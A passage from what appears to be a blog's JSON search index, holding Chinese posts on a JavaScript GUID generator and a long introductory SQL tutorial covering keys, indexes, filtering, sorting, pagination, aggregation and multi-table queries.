rd\n","slug":"高考季：我来给你说说湘潭大学","date":"2020-11-27T03:05:00.000Z","categories_index":"生活","tags_index":"湘大","author_index":"kif"},{"id":"a39c7435e01b208d6a8bdb3f64120a16","title":"GUID生成算法","content":"随机数不管是前端还是后端都会用到的一个地方，不管是从验证码还是各种生成的状态码，基本都是随机生成的，还有就是一些抽奖的算法，也是用随机数来处理的，生成随机数的方法目前是很多的，但是其实很多是重复性很大的，今天简单的讲一下怎么生成随机数重复性很低的一种办法GUID（Globally Unique Identifier）一种由算法生成的二进制长度为128位的数字标识符\n不重复的原理：GUID 的总数达到了2^128（3.4×10^38）个，所以随机生成两个相同GUID的可能性非常小，但并不为0。用于生成GUID的算法通常都加入了非随机的参数（如时间），以保证这种重复的情况不会发生。\n不BB上代码：\nGUID的 js：\nfunction GUID() &#123;\n\n    this.date &#x3D; new Date();\n\n    &#x2F;* 判断是否初始化过，如果初始化过以下代码，则以下代码将不再执行，实际中只执行一次 *&#x2F;\n\n    if (typeof this.newGUID !&#x3D; &#39;function&#39;) &#123;\n\n\n\n        &#x2F;* 生成GUID码 *&#x2F;\n\n        GUID.prototype.newGUID &#x3D; function() &#123;\n\n            this.date &#x3D; new Date();\n\n            var guidStr &#x3D; &#39;&#39;;\n\n                sexadecimalDate &#x3D; this.hexadecimal(this.getGUIDDate(), 16);\n\n                sexadecimalTime &#x3D; this.hexadecimal(this.getGUIDTime(), 16);\n\n            for (var i &#x3D; 0; i &lt; 9; i++) &#123;\n\n                guidStr +&#x3D; Math.floor(Math.random()*16).toString(16);\n\n            &#125;\n\n            guidStr +&#x3D; sexadecimalDate;\n\n            guidStr +&#x3D; sexadecimalTime;\n\n            while(guidStr.length &lt; 32) &#123;\n\n                guidStr +&#x3D; Math.floor(Math.random()*16).toString(16);\n\n            &#125;\n\n            return this.formatGUID(guidStr);\n\n        &#125;\n\n        &#x2F;*\n\n   * 功能：获取当前日期的GUID格式，即8位数的日期：19700101\n\n     值：返回GUID日期格式的字条串\n\n        *&#x2F;\n\n        GUID.prototype.getGUIDDate &#x3D; function() &#123;\n\n            return this.date.getFullYear() + this.addZero(this.date.getMonth() + 1) + this.addZero(this.date.getDay());\n\n        &#125;\n\n        &#x2F;*\n\n   * 功能：获取当前时间的GUID格式，即8位数的时间，包括毫秒，毫秒为2位数：12300933\n\n     值：返回GUID日期格式的字条串\n\n        *&#x2F;\n\n        GUID.prototype.getGUIDTime &#x3D; function() &#123;\n\n            return this.addZero(this.date.getHours()) + this.addZero(this.date.getMinutes()) + this.addZero(this.date.getSeconds()) + this.addZero( parseInt(this.date.getMilliseconds() &#x2F; 10 ));\n\n        &#125;\n\n        &#x2F;*\n\n   * 功能: 为一位数的正整数前面添加0，如果是可以转成非NaN数字的字符串也可以实现\n\n     : 参数表示准备再前面添加0的数字或可以转换成数字的字符串\n\n        * 返回值: 如果符合条件，返回添加0后的字条串类型，否则返回自身的字符串\n\n        *&#x2F;\n\n        GUID.prototype.addZero &#x3D; function(num) &#123;\n\n            if (Number(num).toString() !&#x3D; &#39;NaN&#39; &amp;&amp; num &gt;&#x3D; 0 &amp;&amp; num &lt; 10) &#123;\n\n                return &#39;0&#39; + Math.floor(num);\n\n            &#125; else &#123;\n\n                return num.toString();\n\n            &#125;\n\n        &#125;\n\n        &#x2F;*\n\n   * 功能：将y进制的数值，转换为x进制的数值\n\n     ：第1个参数表示欲转换的数值；第2个参数表示欲转换的进制；第3个参数可选，表示当前的进制数，如不写则为10\n\n        * 返回值：返回转换后的字符串\n\n        *&#x2F;\n\n        GUID.prototype.hexadecimal &#x3D; function(num, x, y) &#123;\n\n            if (y !&#x3D; undefined) &#123;\n\n                return parseInt(num.toString(), y).toString(x);\n\n            &#125; else &#123;\n\n                return parseInt(num.toString()).toString(x);\n\n            &#125;\n\n        &#125;\n\n        &#x2F;*\n\n   * 功能：格式化32位的字符串为GUID模式的字符串\n\n     ：第1个参数表示32位的字符串\n\n        * 返回值：标准GUID格式的字符串\n\n        *&#x2F;\n\n        GUID.prototype.formatGUID &#x3D; function(guidStr) &#123;\n\n            var str1 &#x3D; guidStr.slice(0, 8) + &#39;-&#39;,\n\n                str2 &#x3D; guidStr.slice(8, 12) + &#39;-&#39;,\n\n                str3 &#x3D;  guidStr.slice(12, 16) + &#39;-&#39;,\n\n                str4 &#x3D; guidStr.slice(16, 20) + &#39;-&#39;,\n\n                str5 &#x3D; guidStr.slice(20);\n\n            return str1 + str2 + str3 + str4 + str5;\n\n        &#125;\n\n    &#125;\n\n&#125;\n\nHTML代码：\n\n&lt;html&gt;\n\n&lt;head&gt;\n\n\n&lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;\n\n\n&lt;title&gt;&lt;&#x2F;title&gt;\n\n&lt;script src&#x3D;&quot;..&#x2F;js&#x2F;guid.js&quot; type&#x3D;&quot;text&#x2F;javascript&quot; charset&#x3D;&quot;utf-8&quot;&gt;&lt;&#x2F;script&gt;\n\n&lt;&#x2F;head&gt;\n\n&lt;body&gt;\n\n\n\n&lt;&#x2F;body&gt;\n\n&lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;\n\n\nvar guid &#x3D; new GUID();\n\nvar radom &#x3D; guid.newGUID();\n\n&#x2F;*正则处理一下，将中间的-去掉*&#x2F;\n\nvar str &#x3D; radom.replace(&#x2F;-&#x2F;g, &quot;&quot;);\n\nalert(radom);\n\nalert(str);\n\n&lt;&#x2F;script&gt;\n\n&lt;&#x2F;html&gt;\n\n\n\n\n作者：何处锦绣不灰堆\n来源：CSDN\n原文：https://blog.csdn.net/qq_41485414/article/details/80106955\n","slug":"GUID生成算法","date":"2020-11-27T01:20:00.000Z","categories_index":"学习笔记","tags_index":"","author_index":"kif"},{"id":"4caa006bdb2340f9480c9d6a3166e014","title":"Oracle数据库学习","content":"SQL基础主键\n在关系数据库中，一张表中的每一行数据被称为一条记录。一条记录就是由多个字段组成的。例如，students表的两行记录：\n\n\n\nid\nclass_id\nname\ngender\nscore\n\n\n\n1\n1\n小明\nM\n90\n\n\n2\n1\n小红\nF\n95\n\n\n每一条记录都包含若干定义好的字段。同一个表的所有记录都有相同的字段定义。\n对于关系表，有个很重要的约束，就是任意两条记录不能重复。不能重复不是指两条记录不完全相同，而是指能够通过某个字段唯一区分出不同的记录，这个字段被称为主键。\n例如，假设我们把name字段作为主键，那么通过名字小明或小红就能唯一确定一条记录。但是，这么设定，就没法存储同名的同学了，因为插入相同主键的两条记录是不被允许的。\n对主键的要求，最关键的一点是：记录一旦插入到表中，主键最好不要再修改，因为主键是用来唯一定位记录的，修改了主键，会造成一系列的影响。\n由于主键的作用十分重要，如何选取主键会对业务开发产生重要影响。如果我们以学生的身份证号作为主键，似乎能唯一定位记录。然而，身份证号也是一种业务场景，如果身份证号升位了，或者需要变更，作为主键，不得不修改的时候，就会对业务产生严重影响。\n所以，选取主键的一个基本原则是：不使用任何业务相关的字段作为主键。\n因此，身份证号、手机号、邮箱地址这些看上去可以唯一的字段，均不可用作主键。\n作为主键最好是完全业务无关的字段，我们一般把这个字段命名为id。常见的可作为id字段的类型有：\n\n自增整数类型：数据库会在插入数据时自动为每一条记录分配一个自增整数，这样我们就完全不用担心主键重复，也不用自己预先生成主键；\n全局唯一GUID类型：使用一种全局唯一的字符串作为主键，类似8f55d96b-8acc-4636-8cb8-76bf8abc2f57。GUID算法通过网卡MAC地址、时间戳和随机数保证任意计算机在任意时间生成的字符串都是不同的，大部分编程语言都内置了GUID算法，可以自己预算出主键。\n\n对于大部分应用来说，通常自增类型的主键就能满足需求。我们在students表中定义的主键也是BIGINT NOT NULL AUTO_INCREMENT类型。\n 如果使用INT自增类型，那么当一张表的记录数超过2147483647（约21亿）时，会达到上限而出错。使用BIGINT自增类型则可以最多约922亿亿条记录。\n联合主键关系数据库实际上还允许通过多个字段唯一标识记录，即两个或更多的字段都设置为主键，这种主键被称为联合主键。\n对于联合主键，允许一列有重复，只要不是所有主键列都重复即可：\n\n\n\nid_num\nid_type\nother columns…\n\n\n\n1\nA\n…\n\n\n2\nA\n…\n\n\n2\nB\n…\n\n\n如果我们把上述表的id_num和id_type这两列作为联合主键，那么上面的3条记录都是允许的，因为没有两列主键组合起来是相同的。\n没有必要的情况下，我们尽量不使用联合主键，因为它给关系表带来了复杂度的上升。\n小结主键是关系表中记录的唯一标识。主键的选取非常重要：主键不要带有业务含义，而应该使用BIGINT自增或者GUID类型。主键也不应该允许NULL。\n可以使用多个列作为联合主键，但联合主键并不常用。\n外键\n当我们用主键唯一标识记录时，我们就可以在students表中确定任意一个学生的记录：\n\n\n\nid\nname\nother columns…\n\n\n\n1\n小明\n…\n\n\n2\n小红\n…\n\n\n我们还可以在classes表中确定任意一个班级记录：\n\n\n\nid\nname\nother columns…\n\n\n\n1\n一班\n…\n\n\n2\n二班\n…\n\n\n但是我们如何确定students表的一条记录，例如，id=1的小明，属于哪个班级呢？\n由于一个班级可以有多个学生，在关系模型中，这两个表的关系可以称为“一对多”，即一个classes的记录可以对应多个students表的记录。\n为了表达这种一对多的关系，我们需要在students表中加入一列class_id，让它的值与classes表的某条记录相对应：\n\n\n\nid\nclass_id\nname\nother columns…\n\n\n\n1\n1\n小明\n…\n\n\n2\n1\n小红\n…\n\n\n5\n2\n小白\n…\n\n\n这样，我们就可以根据class_id这个列直接定位出一个students表的记录应该对应到classes的哪条记录。\n例如：\n\n小明的class_id是1，因此，对应的classes表的记录是id=1的一班；\n小红的class_id是1，因此，对应的classes表的记录是id=1的一班；\n小白的class_id是2，因此，对应的classes表的记录是id=2的二班。\n\n在students表中，通过class_id的字段，可以把数据与另一张表关联起来，这种列称为外键。\n外键并不是通过列名实现的，而是通过定义外键约束实现的：\nALTER TABLE students\nADD CONSTRAINT fk_class_id\nFOREIGN KEY (class_id)\nREFERENCES classes (id);\n\n其中，外键约束的名称fk_class_id可以任意，FOREIGN KEY (class_id)指定了class_id作为外键，REFERENCES classes (id)指定了这个外键将关联到classes表的id列（即classes表的主键）。\n通过定义外键约束，关系数据库可以保证无法插入无效的数据。即如果classes表不存在id=99的记录，students表就无法插入class_id=99的记录。\n由于外键约束会降低数据库的性能，大部分互联网应用程序为了追求速度，并不设置外键约束，而是仅靠应用程序自身来保证逻辑的正确性。这种情况下，class_id仅仅是一个普通的列，只是它起到了外键的作用而已。\n要删除一个外键约束，也是通过ALTER TABLE实现的：\nALTER TABLE students\nDROP FOREIGN KEY fk_class_id;\n\n注意：删除外键约束并没有删除外键这一列。删除列是通过DROP COLUMN ...实现的。\n多对多通过一个表的外键关联到另一个表，我们可以定义出一对多关系。有些时候，还需要定义“多对多”关系。例如，一个老师可以对应多个班级，一个班级也可以对应多个老师，因此，班级表和老师表存在多对多关系。\n多对多关系实际上是通过两个一对多关系实现的，即通过一个中间表，关联两个一对多关系，就形成了多对多关系：\nteachers表：\n\n\n\nid\nname\n\n\n\n1\n张老师\n\n\n2\n王老师\n\n\n3\n李老师\n\n\n4\n赵老师\n\n\nclasses表：\n\n\n\nid\nname\n\n\n\n1\n一班\n\n\n2\n二班\n\n\n中间表teacher_class关联两个一对多关系：\n\n\n\nid\nteacher_id\nclass_id\n\n\n\n1\n1\n1\n\n\n2\n1\n2\n\n\n3\n2\n1\n\n\n4\n2\n2\n\n\n5\n3\n1\n\n\n6\n4\n2\n\n\n通过中间表teacher_class可知teachers到classes的关系：\n\nid=1的张老师对应id=1,2的一班和二班；\nid=2的王老师对应id=1,2的一班和二班；\nid=3的李老师对应id=1的一班；\nid=4的赵老师对应id=2的二班。\n\n同理可知classes到teachers的关系：\n\nid=1的一班对应id=1,2,3的张老师、王老师和李老师；\nid=2的二班对应id=1,2,4的张老师、王老师和赵老师；\n\n因此，通过中间表，我们就定义了一个“多对多”关系。\n一对一一对一关系是指，一个表的记录对应到另一个表的唯一一个记录。\n例如，students表的每个学生可以有自己的联系方式，如果把联系方式存入另一个表contacts，我们就可以得到一个“一对一”关系：\n\n\n\nid\nstudent_id\nmobile\n\n\n\n1\n1\n135xxxx6300\n\n\n2\n2\n138xxxx2209\n\n\n3\n5\n139xxxx8086\n\n\n有细心的童鞋会问，既然是一对一关系，那为啥不给students表增加一个mobile列，这样就能合二为一了？\n如果业务允许，完全可以把两个表合为一个表。但是，有些时候，如果某个学生没有手机号，那么，contacts表就不存在对应的记录。实际上，一对一关系准确地说，是contacts表一对一对应students表。\n还有一些应用会把一个大表拆成两个一对一的表，目的是把经常读取和不经常读取的字段分开，以获得更高的性能。例如，把一个大的用户表分拆为用户基本信息表user_info和用户详细信息表user_profiles，大部分时候，只需要查询user_info表，并不需要查询user_profiles表，这样就提高了查询速度。\n小结关系数据库通过外键可以实现一对多、多对多和一对一的关系。外键既可以通过数据库来约束，也可以不设置约束，仅依靠应用程序的逻辑来保证。\n索引\n在关系数据库中，如果有上万甚至上亿条记录，在查找记录的时候，想要获得非常快的速度，就需要使用索引。\n索引是关系数据库中对某一列或多个列的值进行预排序的数据结构。通过使用索引，可以让数据库系统不必扫描整个表，而是直接定位到符合条件的记录，这样就大大加快了查询速度。\n例如，对于students表：\n\n\n\nid\nclass_id\nname\ngender\nscore\n\n\n\n1\n1\n小明\nM\n90\n\n\n2\n1\n小红\nF\n95\n\n\n3\n1\n小军\nM\n88\n\n\n如果要经常根据score列进行查询，就可以对score列创建索引：\nALTER TABLE students\nADD INDEX idx_score (score);\n\n使用ADD INDEX idx_score (score)就创建了一个名称为idx_score，使用列score的索引。索引名称是任意的，索引如果有多列，可以在括号里依次写上，例如：\nALTER TABLE students\nADD INDEX idx_name_score (name, score);\n\n索引的效率取决于索引列的值是否散列，即该列的值如果越互不相同，那么索引效率越高。反过来，如果记录的列存在大量相同的值，例如gender列，大约一半的记录值是M，另一半是F，因此，对该列创建索引就没有意义。\n可以对一张表创建多个索引。索引的优点是提高了查询效率，缺点是在插入、更新和删除记录时，需要同时修改索引，因此，索引越多，插入、更新和删除记录的速度就越慢。\n对于主键，关系数据库会自动对其创建主键索引。使用主键索引的效率是最高的，因为主键会保证绝对唯一。\n唯一索引在设计关系数据表的时候，看上去唯一的列，例如身份证号、邮箱地址等，因为他们具有业务含义，因此不宜作为主键。\n但是，这些列根据业务要求，又具有唯一性约束：即不能出现两条记录存储了同一个身份证号。这个时候，就可以给该列添加一个唯一索引。例如，我们假设students表的name不能重复：\nALTER TABLE students\nADD UNIQUE INDEX uni_name (name);\n\n通过UNIQUE关键字我们就添加了一个唯一索引。\n也可以只对某一列添加一个唯一约束而不创建唯一索引：\nALTER TABLE students\nADD CONSTRAINT uni_name UNIQUE (name);\n\n这种情况下，name列没有索引，但仍然具有唯一性保证。\n无论是否创建索引，对于用户和应用程序来说，使用关系数据库不会有任何区别。这里的意思是说，当我们在数据库中查询时，如果有相应的索引可用，数据库系统就会自动使用索引来提高查询效率，如果没有索引，查询也能正常执行，只是速度会变慢。因此，索引可以在使用数据库的过程中逐步优化。\n小结通过对数据库表创建索引，可以提高查询速度。\n通过创建唯一索引，可以保证某一列的值具有唯一性。\n数据库索引对于用户和应用程序来说都是透明的。\n基本查询\n要查询数据库表的数据，我们使用如下的SQL语句：\nSELECT * FROM &lt;表名&gt;\n\n假设表名是students，要查询students表的所有行，我们用如下SQL语句：\nSELECT * FROM students;\n\n\n\n\n使用SELECT * FROM students时，SELECT是关键字，表示将要执行一个查询，*表示“所有列”，FROM表示将要从哪个表查询，本例中是students表。\n该SQL将查询出students表的所有数据。注意：查询结果也是一个二维表，它包含列名和每一行的数据。\n要查询classes表的所有行，我们用如下SQL语句：\nSELECT * FROM classes;\n\n\n运行上述SQL语句，观察查询结果。\nSELECT语句其实并不要求一定要有FROM子句。我们来试试下面的SELECT语句：\nSELECT 100+200;\n\n\n上述查询会直接计算出表达式的结果。虽然SELECT可以用作计算，但它并不是SQL的强项。但是，不带FROM子句的SELECT语句有一个有用的用途，就是用来判断当前到数据库的连接是否有效。许多检测工具会执行一条SELECT 1;来测试数据库连接。\n小结使用SELECT查询的基本语句SELECT * FROM &lt;表名&gt;可以查询一个表的所有行和所有列的数据。\nSELECT查询的结果是一个二维表。\n条件查询\n使用SELECT * FROM &lt;表名&gt;可以查询到一张表的所有记录。但是，很多时候，我们并不希望获得所有记录，而是根据条件选择性地获取指定条件的记录，例如，查询分数在80分以上的学生记录。在一张表有数百万记录的情况下，获取所有记录不仅费时，还费内存和网络带宽。\nSELECT语句可以通过WHERE条件来设定查询条件，查询结果是满足查询条件的记录。例如，要指定条件“分数在80分或以上的学生”，写成WHERE条件就是SELECT * FROM students WHERE score &gt;= 80。\n其中，WHERE关键字后面的score &gt;= 80就是条件。score是列名，该列存储了学生的成绩，因此，score &gt;= 80就筛选出了指定条件的记录：\nSELECT * FROM students WHERE score &gt;&#x3D; 80;\n\n\n因此，条件查询的语法就是：\nSELECT * FROM &lt;表名&gt; WHERE &lt;条件表达式&gt;\n\n条件表达式可以用&lt;条件1&gt; AND &lt;条件2&gt;表达满足条件1并且满足条件2。例如，符合条件“分数在80分或以上”，并且还符合条件“男生”，把这两个条件写出来：\n\n条件1：根据score列的数据判断：score &gt;= 80；\n条件2：根据gender列的数据判断：gender = &#39;M&#39;，注意gender列存储的是字符串，需要用单引号括起来。\n\n就可以写出WHERE条件：score &gt;= 80 AND gender = &#39;M&#39;：\nSELECT * FROM students WHERE score &gt;&#x3D; 80 AND gender &#x3D; &#39;M&#39;;\n\n\n第二种条件是&lt;条件1&gt; OR &lt;条件2&gt;，表示满足条件1或者满足条件2。例如，把上述AND查询的两个条件改为OR，查询结果就是“分数在80分或以上”或者“男生”，满足任意之一的条件即选出该记录：\nSELECT * FROM students WHERE score &gt;&#x3D; 80 OR gender &#x3D; &#39;M&#39;;\n\n\n很显然OR条件要比AND条件宽松，返回的符合条件的记录也更多。\n第三种条件是NOT &lt;条件&gt;，表示“不符合该条件”的记录。例如，写一个“不是2班的学生”这个条件，可以先写出“是2班的学生”：class_id = 2，再加上NOT：NOT class_id = 2：\nSELECT * FROM students WHERE NOT class_id &#x3D; 2;\n\n\n上述NOT条件NOT class_id = 2其实等价于class_id &lt;&gt; 2，因此，NOT查询不是很常用。\n要组合三个或者更多的条件，就需要用小括号()表示如何进行条件运算。例如，编写一个复杂的条件：分数在80以下或者90以上，并且是男生：\nSELECT * FROM students WHERE (score &lt; 80 OR score &gt; 90) AND gender &#x3D; &#39;M&#39;;\n\n\n如果不加括号，条件运算按照NOT、AND、OR的优先级进行，即NOT优先级最高，其次是AND，最后是OR。加上括号可以改变优先级。\n常用的条件表达式\n\n\n条件\n表达式举例1\n表达式举例2\n说明\n\n\n\n使用&#x3D;判断相等\nscore &#x3D; 80\nname &#x3D; ‘abc’\n字符串需要用单引号括起来\n\n\n使用&gt;判断大于\nscore &gt; 80\nname &gt; ‘abc’\n字符串比较根据ASCII码，中文字符比较根据数据库设置\n\n\n使用&gt;&#x3D;判断大于或相等\nscore &gt;&#x3D; 80\nname &gt;&#x3D; ‘abc’\n\n\n\n使用&lt;判断小于\nscore &lt; 80\nname &lt;&#x3D; ‘abc’\n\n\n\n使用&lt;&#x3D;判断小于或相等\nscore &lt;&#x3D; 80\nname &lt;&#x3D; ‘abc’\n\n\n\n使用&lt;&gt;判断不相等\nscore &lt;&gt; 80\nname &lt;&gt; ‘abc’\n\n\n\n使用LIKE判断相似\nname LIKE ‘ab%’\nname LIKE ‘%bc%’\n%表示任意字符，例如’ab%’将匹配’ab’，’abc’，’abcd’\n\n\n小结通过WHERE条件查询，可以筛选出符合指定条件的记录，而不是整个表的所有记录。\n投影查询\n使用SELECT * FROM &lt;表名&gt; WHERE &lt;条件&gt;可以选出表中的若干条记录。我们注意到返回的二维表结构和原表是相同的，即结果集的所有列与原表的所有列都一一对应。\n如果我们只希望返回某些列的数据，而不是所有列的数据，我们可以用SELECT 列1, 列2, 列3 FROM ...，让结果集仅包含指定列。这种操作称为投影查询。\n例如，从students表中返回id、score和name这三列：\nSELECT id, score, name FROM students;\n\n\n这样返回的结果集就只包含了我们指定的列，并且，结果集的列的顺序和原表可以不一样。\n使用SELECT 列1, 列2, 列3 FROM ...时，还可以给每一列起个别名，这样，结果集的列名就可以与原表的列名不同。它的语法是SELECT 列1 别名1, 列2 别名2, 列3 别名3 FROM ...。\n例如，以下SELECT语句将列名score重命名为points，而id和name列名保持不变：\nSELECT id, score points, name FROM students;\n\n\n投影查询同样可以接WHERE条件，实现复杂的查询：\nSELECT id, score points, name FROM students WHERE gender &#x3D; &#39;M&#39;;\n\n\n\n\n小结使用SELECT *表示查询表的所有列，使用SELECT 列1, 列2, 列3则可以仅返回指定列，这种操作称为投影。\nSELECT语句可以对结果集的列进行重命名。\n排序\n排序我们使用SELECT查询时，细心的读者可能注意到，查询结果集通常是按照id排序的，也就是根据主键排序。这也是大部分数据库的做法。如果我们要根据其他条件排序怎么办？可以加上ORDER BY子句。例如按照成绩从低到高进行排序：\nSELECT id, name, gender, score FROM students ORDER BY score;\n\n\n如果要反过来，按照成绩从高到底排序，我们可以加上DESC表示“倒序”：\nSELECT id, name, gender, score FROM students ORDER BY score DESC;\n\n\n如果score列有相同的数据，要进一步排序，可以继续添加列名。例如，使用ORDER BY score DESC, gender表示先按score列倒序，如果有相同分数的，再按gender列排序：\nSELECT id, name, gender, score FROM students ORDER BY score DESC, gender;\n\n\n默认的排序规则是ASC：“升序”，即从小到大。ASC可以省略，即ORDER BY score ASC和ORDER BY score效果一样。\n如果有WHERE子句，那么ORDER BY子句要放到WHERE子句后面。例如，查询一班的学生成绩，并按照倒序排序：\nSELECT id, name, gender, score\nFROM students\nWHERE class_id &#x3D; 1\nORDER BY score DESC;\n\n\n这样，结果集仅包含符合WHERE条件的记录，并按照ORDER BY的设定排序。\n小结使用ORDER BY可以对结果集进行排序；\n可以对多列进行升序、倒序排序。\n分页\n使用SELECT查询时，如果结果集数据量很大，比如几万行数据，放在一个页面显示的话数据量太大，不如分页显示，每次显示100条。\n要实现分页功能，实际上就是从结果集中显示第1100条记录作为第1页，显示第101200条记录作为第2页，以此类推。\n因此，分页实际上就是从结果集中“截取”出第M~N条记录。这个查询可以通过LIMIT &lt;M&gt; OFFSET &lt;N&gt;子句实现。我们先把所有学生按照成绩从高到低进行排序：\nSELECT id, name, gender, score FROM students ORDER BY score DESC;\n\n\n现在，我们把结果集分页，每页3条记录。要获取第1页的记录，可以使用LIMIT 3 OFFSET 0：\nSELECT id, name, gender, score\nFROM students\nORDER BY score DESC\nLIMIT 3 OFFSET 0;\n\n\n上述查询LIMIT 3 OFFSET 0表示，对结果集从0号记录开始，最多取3条。注意SQL记录集的索引从0开始。\n如果要查询第2页，那么我们只需要“跳过”头3条记录，也就是对结果集从3号记录开始查询，把OFFSET设定为3：\nSELECT id, name, gender, score\nFROM students\nORDER BY score DESC\nLIMIT 3 OFFSET 3;\n\n\n类似的，查询第3页的时候，OFFSET应该设定为6:\nSELECT id, name, gender, score\nFROM students\nORDER BY score DESC\nLIMIT 3 OFFSET 6;\n\n\n查询第4页的时候，OFFSET应该设定为9:\nSELECT id, name, gender, score\nFROM students\nORDER BY score DESC\nLIMIT 3 OFFSET 9;\n\n\n由于第4页只有1条记录，因此最终结果集按实际数量1显示。LIMIT 3表示的意思是“最多3条记录”。\n可见，分页查询的关键在于，首先要确定每页需要显示的结果数量pageSize（这里是3），然后根据当前页的索引pageIndex（从1开始），确定LIMIT和OFFSET应该设定的值：\n\nLIMIT总是设定为pageSize；\nOFFSET计算公式为pageSize * (pageIndex - 1)。\n\n这样就能正确查询出第N页的记录集。\n如果原本记录集一共就10条记录，但我们把OFFSET设置为20，会得到什么结果呢？\nSELECT id, name, gender, score\nFROM students\nORDER BY score DESC\nLIMIT 3 OFFSET 20;\n\n\nOFFSET超过了查询的最大数量并不会报错，而是得到一个空的结果集。\n\n注意OFFSET是可选的，如果只写LIMIT 15，那么相当于LIMIT 15 OFFSET 0。\n在MySQL中，LIMIT 15 OFFSET 30还可以简写成LIMIT 30, 15。\n使用LIMIT &lt;M&gt; OFFSET &lt;N&gt;分页时，随着N越来越大，查询效率也会越来越低。\n小结使用LIMIT &lt;M&gt; OFFSET &lt;N&gt;可以对结果集进行分页，每次查询返回结果集的一部分；\n分页查询需要先确定每页的数量和当前页数，然后确定LIMIT和OFFSET的值。\n聚合查询\n如果我们要统计一张表的数据量，例如，想查询students表一共有多少条记录，难道必须用SELECT * FROM students查出来然后再数一数有多少行吗？\n这个方法当然可以，但是比较弱智。对于统计总数、平均数这类计算，SQL提供了专门的聚合函数，使用聚合函数进行查询，就是聚合查询，它可以快速获得结果。\n仍然以查询students表一共有多少条记录为例，我们可以使用SQL内置的COUNT()函数查询：\nSELECT COUNT(*) FROM students;\n\n\nCOUNT(*)表示查询所有列的行数，要注意聚合的计算结果虽然是一个数字，但查询的结果仍然是一个二维表，只是这个二维表只有一行一列，并且列名是COUNT(*)。\n通常，使用聚合查询时，我们应该给列名设置一个别名，便于处理结果：\nSELECT COUNT(*) num FROM students;\n\n\nCOUNT(*)和COUNT(id)实际上是一样的效果。另外注意，聚合查询同样可以使用WHERE条件，因此我们可以方便地统计出有多少男生、多少女生、多少80分以上的学生等：\nSELECT COUNT(*) boys FROM students WHERE gender &#x3D; &#39;M&#39;;\n\n\n除了COUNT()函数外，SQL还提供了如下聚合函数：\n\n\n\n函数\n说明\n\n\n\nSUM\n计算某一列的合计值，该列必须为数值类型\n\n\nAVG\n计算某一列的平均值，该列必须为数值类型\n\n\nMAX\n计算某一列的最大值\n\n\nMIN\n计算某一列的最小值\n\n\n注意，MAX()和MIN()函数并不限于数值类型。如果是字符类型，MAX()和MIN()会返回排序最后和排序最前的字符。\n要统计男生的平均成绩，我们用下面的聚合查询：\nSELECT AVG(score) average FROM students WHERE gender &#x3D; &#39;M&#39;;\n\n\n\n\n\n要特别注意：如果聚合查询的WHERE条件没有匹配到任何行，COUNT()会返回0，而SUM()、AVG()、MAX()和MIN()会返回NULL：\n每页3条记录，如何通过聚合查询获得总页数？\nSELECT CEILING(COUNT(*) &#x2F; 3) FROM students;\n分组如果我们要统计一班的学生数量，我们知道，可以用SELECT COUNT(*) num FROM students WHERE class_id = 1;。如果要继续统计二班、三班的学生数量，难道必须不断修改WHERE条件来执行SELECT语句吗？\n对于聚合查询，SQL还提供了“分组聚合”的功能。我们观察下面的聚合查询：\nSELECT COUNT(*) num FROM students GROUP BY class_id;\n\n\n\n\n\n执行这个查询，COUNT()的结果不再是一个，而是3个，这是因为，GROUP BY子句指定了按class_id分组，因此，执行该SELECT语句时，会把class_id相同的列先分组，再分别计算，因此，得到了3行结果。\n但是这3行结果分别是哪三个班级的，不好看出来，所以我们可以把class_id列也放入结果集中：\nSELECT class_id, COUNT(*) num FROM students GROUP BY class_id;\n\n\n\n这下结果集就可以一目了然地看出各个班级的学生人数。我们再试试把name放入结果集：\nSELECT name, class_id, COUNT(*) num FROM students GROUP BY class_id;\n\n\n\n\n\n不出意外，执行这条查询我们会得到一个语法错误，因为在任意一个分组中，只有class_id都相同，name是不同的，SQL引擎不能把多个name的值放入一行记录中。因此，聚合查询的列中，只能放入分组的列。\n练习请使用一条SELECT查询查出每个班级的平均分：\nSELECT class_id, avg(score)   from students group by class_id\n\n\n请使用一条SELECT查询查出每个班级男生和女生的平均分：\nSELECT class_id,gender, avg(score)   from students  group by class_id,gender;\n\n\n多表查询SELECT查询不但可以从一张表查询数据，还可以从多张表同时查询数据。查询多张表的语法是：SELECT * FROM &lt;表1&gt; &lt;表2&gt;。\n例如，同时从students表和classes表的“乘积”，即查询数据，可以这么写：\nselect * from students,classes\n\n\n这种一次查询两个表的数据，查询的结果也是一个二维表，它是students表和classes表的“乘积”，即students表的每一行与classes表的每一行都两两拼在一起返回。结果集的列数是students表和classes表的列数之和，行数是students表和classes表的行数之积。\n这种多表查询又称笛卡尔查询，使用笛卡尔查询时要非常小心，由于结果集是目标表的行数乘积，对两个各自有100行记录的表进行笛卡尔查询将返回1万条记录，对两个各自有1万行记录的表进行笛卡尔查询将返回1亿条记录。\n你可能还注意到了，上述查询的结果集有两列id和两列name，两列id是因为其中一列是students表的id，而另一列是classes表的id，但是在结果集中，不好区分。两列name同理\n要解决这个问题，我们仍然可以利用投影查询的“设置列的别名”来给两个表各自的id和name列起别名：\nSELECT\n    students.id sid,\n    students.name,\n    students.gender,\n    students.score,\n    classes.id cid,\n    classes.name cname\nFROM students, classes;\n\n\n注意，多表查询时，要使用表名.列名这样的方式来引用列和设置别名，这样就避免了结果集的列名重复问题。但是，用表名.列名这种方式列举两个表的所有列实在是很麻烦，所以SQL还允许给表设置一个别名，让我们在投影查询中引用起来稍微简洁一点：\nSELECT\n    a.id sid,\n    a.name,\n    a.gender,\n    a.score,\n    b.id cid,\n    b.name cname\nFROM students a, classes b;\n\n\n注意到FROM子句给表设置别名的语法是FROM &lt;表名1&gt; &lt;别名1&gt;, &lt;表名2&gt; &lt;别名2&gt;。这样我们用别名s和c分别表示students表和classes表。\n多表查询也是可以添加WHERE条件的，我们来试试：\nSELECT\n    s.id sid,\n    s.name,\n    s.gender,\n    s.score,\n    c.id cid,\n    c.name cname\nFROM students s, classes c\nWHERE s.gender &#x3D; &#39;M&#39; AND c.id &#x3D; 1;\n\n\n这个查询的结果集每行记录都满足条件s.gender = &#39;M&#39;和c.id = 1。添加WHERE条件后结果集的数量大大减少了。\n小结使用多表查询可以获取M x N行记录；\n多表查询的结果集可能非常巨大，要小心使用。\n连接查询\n连接查询是另一种类型的多表查询。连接查询对多个表进行JOIN运算，简单地说，就是先确定一个主表作为结果集，然后，把其他表的行有选择性地“连接”在主表结果集上。\n例如，我们想要选出students表的所有学生信息，可以用一条简单的SELECT语句完成：\nselect * from 